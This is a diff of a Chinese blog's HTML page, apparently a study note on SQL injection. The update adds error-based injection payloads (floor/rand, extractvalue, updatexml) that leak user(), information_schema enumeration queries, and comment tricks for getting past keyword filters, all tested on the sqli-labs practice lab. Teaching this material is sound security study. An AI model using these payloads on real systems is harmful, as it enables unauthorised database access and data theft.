@@ -59,10 +59,11 @@
 <meta property="og:image" content="http://huhusmang.github.io/2021/11/22/SQL%E6%B3%A8%E5%85%A5/15.png">
 <meta property="og:image" content="http://huhusmang.github.io/2021/11/22/SQL%E6%B3%A8%E5%85%A5/16.png">
 <meta property="og:image" content="http://huhusmang.github.io/2021/11/22/SQL%E6%B3%A8%E5%85%A5/18.png">
-<meta property="og:image" content="http://huhusmang.github.io/2021/11/22/SQL%E6%B3%A8%E5%85%A5/19.png">
+<meta property="og:image" content="http://huhusmang.github.io/2021/11/22/SQL%E6%B3%A8%E5%85%A5/20.png">
+<meta property="og:image" content="http://huhusmang.github.io/2021/11/22/SQL%E6%B3%A8%E5%85%A5/21.png">
 <meta property="og:image" content="http://huhusmang.github.io/2021/11/22/SQL%E6%B3%A8%E5%85%A5/bz.png">
 <meta property="article:published_time" content="2021-11-22T05:46:24.000Z">
-<meta property="article:modified_time" content="2021-11-29T05:47:33.757Z">
+<meta property="article:modified_time" content="2021-11-30T11:18:24.547Z">
 <meta property="article:author" content="huhu">
 <meta property="article:tag" content="SQL">
 <meta name="twitter:card" content="summary">
@@ -231,7 +232,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-29 13:47:33" itemprop="dateModified" datetime="2021-11-29T13:47:33+08:00">2021-11-29</time>
+                <time title="修改时间：2021-11-30 19:18:24" itemprop="dateModified" datetime="2021-11-30T19:18:24+08:00">2021-11-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -277,14 +278,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.4k</span>
+              <span>3.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -296,12 +297,12 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="一、注入原理"><a href="#一、注入原理" class="headerlink" title="一、注入原理"></a>一、注入原理</h2><p>​    由于B/S(客户端 / 服务器模式)建立在互联网上，对安全控制能力较弱。开发人员在编写代码时对用户的<strong>输入没有进行严格的合法性判断</strong>，导致<strong>攻击者可以利用这个漏洞提交一段数据库查询代码</strong>，进而获取数据库中的一些信息。</p>
+        <h2 id="一、注入原理"><a href="#一、注入原理" class="headerlink" title="一、注入原理"></a>一、注入原理</h2><p>​    由于B/S(客户端 / 服务器模式)建立在互联网上，对安全控制能力较弱。开发人员在编写代码时对用户的<strong>输入没有进行严格的合法性判断</strong>，导致<strong>攻击者可以利用这个漏洞<font color="red" size="4">提交一段数据库查询代码</font></strong>，进而获取数据库中的一些信息。</p>
 <img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/1.png" alt="相对路径图片" style="zoom:55%;">
 
 <h2 id="二、Mysql常用函数"><a href="#二、Mysql常用函数" class="headerlink" title="二、Mysql常用函数"></a>二、Mysql常用函数</h2><img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/2.png" alt="相对路径图片" style="zoom:55%;">
 
-<p>在返回数据库名时，要先使用一个数据库</p>
+<p>在返回数据库名时，要<strong>先使用一个数据库</strong></p>
 <img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/3.png" alt="相对路径图片" style="zoom:55%;">
 
 <p>几个重要的数据库:</p>
@@ -309,13 +310,13 @@
 <p>information_schema.schemta表中的SCHEMA_NAME列，存储的是<strong>所有数据库名称</strong>。</p>
 <img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/8.png" alt="相对路径图片" style="zoom:55%;">
 
-<p>information_schema.tables中table_name列对应数据库所有表名，其中table_schema列是所有数据库名。</p>
+<p>information_schema.tables中table_name列对应数据库所有表名，其中<strong>table_schema列是所有数据库名</strong>。</p>
 <img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/9.png" alt="相对路径图片" style="zoom:55%;">
 
 <p>information_schema.columns中，column_name列对应所有列名，其中table_schema列也对应所有数据库名，table_name列也对应所有表名。</p>
 <img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/10.png" alt="相对路径图片" style="zoom:55%;">
 
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases; //查看数据库</span><br><span class="line"></span><br><span class="line">use xxx; //使用某个数据库</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>; //查看该数据库的数据表</span><br><span class="line"></span><br><span class="line"><span class="keyword">desc</span> xxx; //查看该数据表的结构</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> xxx; //查找某个数据表的所有内容</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">schema_name</span> <span class="keyword">from</span> information_schema.schemata; //取所有数据库</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;xxxxx&#x27;</span>(也可以是<span class="keyword">database</span>(),这样就返回了所有的数据表); //取某数据库的数据表</span><br><span class="line"></span><br><span class="line"><span class="keyword">Select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;xxxxx&#x27;</span>; //取某表的所有列</span><br><span class="line"></span><br><span class="line">使用<span class="keyword">order</span> <span class="keyword">by</span>查列数，<span class="keyword">order</span> <span class="keyword">by</span>语法为：<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">column</span> 此处以数字<span class="number">1</span>,<span class="number">2</span>,<span class="number">3.</span>..指定以某一列为key进行排序，通过尝试得出列数。查询列数原因是因为我们使用<span class="keyword">union</span>联合查询时，前后的语句要有相同的列。</span><br><span class="line">（只有最后一个语句允许有<span class="keyword">order</span> <span class="keyword">by</span>)</span><br><span class="line"></span><br><span class="line">concat():联合数据，用于联合两条数据结果。</span><br><span class="line">group_concat()：和concat()类似，用于把多条数据一次注入出来。</span><br><span class="line"></span><br><span class="line">left(a,b) //从左侧截取 a 的前 b 位</span><br><span class="line"></span><br><span class="line">mid(<span class="built_in">column_name</span>,<span class="keyword">start</span>[,length]) //从位置<span class="keyword">start</span>开始，截取<span class="built_in">column_name</span>字符串的length位，与substr作用相同</span><br><span class="line"></span><br><span class="line">substr(string, <span class="keyword">start</span>, length) //从位置<span class="keyword">start</span>开始，截取字符串string的length长度，与mid作用相同</span><br><span class="line"></span><br><span class="line">ascii() //将某个字符转换成ascii码</span><br><span class="line"></span><br><span class="line">ord() //将某个字符转换成ascii码，同ascii()</span><br><span class="line"></span><br><span class="line">行间注释：(注释后面的内容)</span><br><span class="line"> 	<span class="comment">-- :DROP sampletable;--</span></span><br><span class="line"> 	#  :<span class="keyword">DROP</span> sampletable;#</span><br><span class="line"> 	</span><br><span class="line">行内注释：</span><br><span class="line">	<span class="comment">/*注释内容*/</span>：<span class="keyword">DROP</span><span class="comment">/*comment*/</span>sampletable`   DR<span class="comment">/**/</span>OP<span class="comment">/*绕过过滤*/</span>sampletable`   <span class="keyword">SELECT</span><span class="comment">/*替换空格*/</span><span class="keyword">password</span><span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>Members</span><br><span class="line">	<span class="comment">/*! MYSQL专属 */</span>：<span class="keyword">SELECT</span> <span class="comment">/*!32302 1/0, */</span> <span class="number">1</span> <span class="keyword">FROM</span> tablename</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">show databases; //查看数据库</span><br><span class="line"></span><br><span class="line">use xxx; //使用某个数据库</span><br><span class="line"></span><br><span class="line">show tables; //查看该数据库的数据表</span><br><span class="line"></span><br><span class="line">desc xxx; //查看该数据表的结构</span><br><span class="line"></span><br><span class="line">select * from xxx; //查找某个数据表的所有内容</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata; //取所有数据库</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;xxxxx&#x27;(也可以是database(),这样就返回了所有的数据表); //取某数据库的数据表</span><br><span class="line"></span><br><span class="line">Select column_name from information_schema.columns where table_name=&#x27;xxxxx&#x27;; //取某表的所有列</span><br><span class="line"></span><br><span class="line">使用order by查列数，order by语法为：ORDER BY column 此处以数字1,2,3...指定以某一列为key进行排序，通过尝试得出列数。查询列数原因是因为我们使用union联合查询时，前后的语句要有相同的列。</span><br><span class="line">（只有最后一个语句允许有order by)</span><br><span class="line"></span><br><span class="line">concat():联合数据，用于联合两条数据结果。</span><br><span class="line">group_concat()：和concat()类似，用于把多条数据一次注入出来。</span><br><span class="line"></span><br><span class="line">left(a,b) //从左侧截取 a 的前 b 位</span><br><span class="line"></span><br><span class="line">mid(column_name,start[,length]) //从位置start开始，截取column_name字符串的length位，与substr作用相同</span><br><span class="line"></span><br><span class="line">substr(string, start, length) //从位置start开始，截取字符串string的length长度，与mid作用相同</span><br><span class="line"></span><br><span class="line">ascii() //将某个字符转换成ascii码</span><br><span class="line"></span><br><span class="line">ord() //将某个字符转换成ascii码，同ascii()</span><br><span class="line"></span><br><span class="line">行间注释：(注释后面的内容)</span><br><span class="line"> 	-- :DROP sampletable;--</span><br><span class="line"> 	#  :DROP sampletable;#</span><br><span class="line"> 	</span><br><span class="line">行内注释：</span><br><span class="line">	/*注释内容*/：DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`   SELECT/*替换空格*/password/**/FROM/**/Members</span><br><span class="line">	/*! MYSQL专属 */：SELECT /*!32302 1/0, */ 1 FROM tablename</span><br></pre></td></tr></table></figure>
 
 
 
@@ -360,7 +361,26 @@
 
 <h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h4><h5 id="报错注入原理："><a href="#报错注入原理：" class="headerlink" title="报错注入原理："></a>报错注入原理：</h5><img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/18.png" alt="相对路径图片" style="zoom:55%;">
 
-<h5 id="报错注入用到的函数："><a href="#报错注入用到的函数：" class="headerlink" title="报错注入用到的函数："></a>报错注入用到的函数：</h5><img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/19.png" alt="相对路径图片" style="zoom:55%;">
+<h5 id="报错注入用到的函数："><a href="#报错注入用到的函数：" class="headerlink" title="报错注入用到的函数："></a>报错注入用到的函数：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line"></span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">或者更常见的：</span><br><span class="line">select count(*),(floor(rand(0)*2))x from information_schema.tables group by x</span><br><span class="line"></span><br><span class="line">注：group_by的意思是根据by对数据按照哪个字段进行分组，或者是哪几个字段进行分组，通俗点说就是相同的归为一类。</span><br></pre></td></tr></table></figure>
+
+<p>group by函数对rand（）进行操作时产生错误，floor函数报错的详细原理请见这个文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xdans/p/5412468.html">https://www.cnblogs.com/xdans/p/5412468.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/8472323.html">https://www.cnblogs.com/litlife/p/8472323.html</a></p>
+<p>如图用sqlli-labs进行测试：</p>
+<img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/20.png" alt="相对路径图片" style="zoom:55%;">
+
+<img src="/2021/11/22/SQL%E6%B3%A8%E5%85%A5/21.png" alt="相对路径图片" style="zoom:55%;">
+
+<p>这里可以看到select语句是可以嵌套的，但是后面的 select 语句外面要<strong>加括号</strong>，否则会报错。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.</span>extractvalue()   XPATH语法错误时报错</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> test <span class="keyword">where</span> id=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="function"><span class="keyword">select</span> <span class="title">user</span>(<span class="params"></span>)),0x7e)))</span>;</span><br><span class="line">注：~的<span class="number">16</span>进制表示就是<span class="number">0x7e</span>,是不符合XPATH语法的，类似的还有 <span class="meta"># 等</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">3</span>.updatexml()     XPATH语法错误时报错</span><br><span class="line"></span><br><span class="line"><span class="attribute">select</span> * from test where id=<span class="number">1</span> and (updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(select user()),<span class="number">0</span>x<span class="number">7</span>e),<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+
+
+
 
 <hr>
 <p>今天就先写到这，本篇就是动态更新博客~，再传统贴张图</p>
@@ -515,12 +535,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">28k</span>
+    <span title="站点总字数">29k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">25 分钟</span>
+    <span title="站点阅读时长">26 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
